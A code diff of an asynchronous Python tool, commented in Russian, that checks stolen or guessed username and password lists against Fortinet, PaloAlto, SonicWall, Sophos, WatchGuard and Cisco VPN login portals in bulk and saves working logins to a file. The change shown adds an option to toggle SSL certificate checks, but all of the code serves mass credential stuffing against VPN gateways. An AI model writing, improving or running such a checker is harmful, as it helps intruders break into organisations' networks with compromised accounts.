@@ -23,6 +23,7 @@ parser.add_argument("--output", default="valid.txt", help="Файл для со�
 parser.add_argument("--threads", type=int, default=100, help="Количество потоков")
 parser.add_argument("--timeout", type=int, default=10, help="Таймаут в секундах")
 parser.add_argument("--verbose", action="store_true", help="Подробный вывод")
+parser.add_argument("--insecure", action="store_true", help="Не проверять SSL сертификаты")
 args = parser.parse_args()
 
 # Проверка типа VPN
@@ -141,7 +142,7 @@ SUCCESS_INDICATORS = {
 }
 
 # Функции для проверки разных типов VPN
-async def check_fortinet(session, ip, username, password):
+async def check_fortinet(session, ip, username, password, verify_ssl=True):
     """Проверка Fortinet VPN"""
     if not ip.startswith("http"):
         ip = f"https://{ip}"
@@ -159,7 +160,7 @@ async def check_fortinet(session, ip, username, password):
     
     try:
         async with semaphore:
-            async with session.post(ip, data=data, ssl=False) as response:
+            async with session.post(ip, data=data, ssl=False if not verify_ssl else None) as response:
                 text = await response.text()
                 
                 # Проверка на успешную аутентификацию
@@ -180,7 +181,7 @@ async def check_fortinet(session, ip, username, password):
     except Exception as e:
         raise Exception(f"Error: {str(e)}")
 
-async def check_paloalto(session, ip, username, password):
+async def check_paloalto(session, ip, username, password, verify_ssl=True):
     """Проверка PaloAlto GlobalProtect VPN"""
     if not ip.startswith("http"):
         ip = f"https://{ip}"
@@ -203,7 +204,7 @@ async def check_paloalto(session, ip, username, password):
     
     try:
         async with semaphore:
-            async with session.post(ip, data=data, ssl=False) as response:
+            async with session.post(ip, data=data, ssl=False if not verify_ssl else None) as response:
                 text = await response.text()
                 
                 # Проверка на успешную аутентификацию
@@ -218,7 +219,7 @@ async def check_paloalto(session, ip, username, password):
     except Exception as e:
         raise Exception(f"Error: {str(e)}")
 
-async def check_sonicwall(session, ip, username, password, domain=""):
+async def check_sonicwall(session, ip, username, password, domain="", verify_ssl=True):
     """Проверка SonicWall VPN"""
     if not ip.startswith("http"):
         ip = f"https://{ip}"
@@ -238,7 +239,7 @@ async def check_sonicwall(session, ip, username, password, domain=""):
     
     try:
         async with semaphore:
-            async with session.post(ip, data=data, ssl=False) as response:
+            async with session.post(ip, data=data, ssl=False if not verify_ssl else None) as response:
                 text = await response.text()
                 
                 # Проверка на успешную аутентификацию
@@ -253,7 +254,7 @@ async def check_sonicwall(session, ip, username, password, domain=""):
     except Exception as e:
         raise Exception(f"Error: {str(e)}")
 
-async def check_sophos(session, ip, username, password, domain=""):
+async def check_sophos(session, ip, username, password, domain="", verify_ssl=True):
     """Проверка Sophos VPN"""
     if not ip.startswith("http"):
         ip = f"https://{ip}"
@@ -273,7 +274,7 @@ async def check_sophos(session, ip, username, password, domain=""):
     
     try:
         async with semaphore:
-            async with session.post(ip, data=data, ssl=False) as response:
+            async with session.post(ip, data=data, ssl=False if not verify_ssl else None) as response:
                 text = await response.text()
                 
                 # Проверка на успешную аутентификацию
@@ -288,7 +289,7 @@ async def check_sophos(session, ip, username, password, domain=""):
     except Exception as e:
         raise Exception(f"Error: {str(e)}")
 
-async def check_watchguard(session, ip, username, password):
+async def check_watchguard(session, ip, username, password, verify_ssl=True):
     """Проверка WatchGuard VPN"""
     # Формат WatchGuard: https://ip:port:Firebox-DB:domain:user:pass
     parts = ip.split(":")
@@ -320,7 +321,7 @@ async def check_watchguard(session, ip, username, password):
     
     try:
         async with semaphore:
-            async with session.post(ip_port, data=data, ssl=False) as response:
+            async with session.post(ip_port, data=data, ssl=False if not verify_ssl else None) as response:
                 text = await response.text()
                 
                 # Проверка на успешную аутентификацию
@@ -335,7 +336,7 @@ async def check_watchguard(session, ip, username, password):
     except Exception as e:
         raise Exception(f"Error: {str(e)}")
 
-async def check_cisco(session, ip, username, password, group=""):
+async def check_cisco(session, ip, username, password, group="", verify_ssl=True):
     """Проверка Cisco ASA VPN"""
     # Формат Cisco: https://ip:port:user:pass:group (group optional)
     parts = ip.split(":")
@@ -365,7 +366,7 @@ async def check_cisco(session, ip, username, password, group=""):
     
     try:
         async with semaphore:
-            async with session.post(ip_port, data=data, ssl=False) as response:
+            async with session.post(ip_port, data=data, ssl=False if not verify_ssl else None) as response:
                 text = await response.text()
                 
                 # Проверка на успешную аутентификацию
@@ -385,39 +386,41 @@ async def process_credential(session, cred, valid_file):
     parts = cred.split(";")
     
     try:
+        verify_ssl = not args.insecure
+
         if args.vpn_type == "fortinet":
             if len(parts) < 3:
                 raise ValueError("Invalid credential format")
             ip, username, password = parts[0], parts[1], parts[2]
-            result = await check_fortinet(session, ip, username, password)
+            result = await check_fortinet(session, ip, username, password, verify_ssl)
         
         elif args.vpn_type == "paloalto":
             if len(parts) < 3:
                 raise ValueError("Invalid credential format")
             ip, username, password = parts[0], parts[1], parts[2]
-            result = await check_paloalto(session, ip, username, password)
+            result = await check_paloalto(session, ip, username, password, verify_ssl)
         
         elif args.vpn_type == "sonicwall":
             if len(parts) < 3:
                 raise ValueError("Invalid credential format")
             ip, username, password = parts[0], parts[1], parts[2]
             domain = parts[3] if len(parts) > 3 else ""
-            result = await check_sonicwall(session, ip, username, password, domain)
+            result = await check_sonicwall(session, ip, username, password, domain, verify_ssl)
         
         elif args.vpn_type == "sophos":
             if len(parts) < 3:
                 raise ValueError("Invalid credential format")
             ip, username, password = parts[0], parts[1], parts[2]
             domain = parts[3] if len(parts) > 3 else ""
-            result = await check_sophos(session, ip, username, password, domain)
+            result = await check_sophos(session, ip, username, password, domain, verify_ssl)
         
         elif args.vpn_type == "watchguard":
             # Специальный формат для WatchGuard
-            result = await check_watchguard(session, cred, "", "")
+            result = await check_watchguard(session, cred, "", "", verify_ssl)
         
         elif args.vpn_type == "cisco":
             # Специальный формат для Cisco
-            result = await check_cisco(session, cred, "", "")
+            result = await check_cisco(session, cred, "", "", verify_ssl)
         
         else:
             raise ValueError(f"Unsupported VPN type: {args.vpn_type}")
@@ -476,7 +479,7 @@ async def main():
     
     # Создаем HTTP сессию
     timeout = aiohttp.ClientTimeout(total=args.timeout)
-    conn = aiohttp.TCPConnector(ssl=False, limit=args.threads)
+    conn = aiohttp.TCPConnector(limit=args.threads, ssl=False if args.insecure else None)
     
     async with aiohttp.ClientSession(timeout=timeout, connector=conn) as session:
         # Запускаем задачу обновления статистики
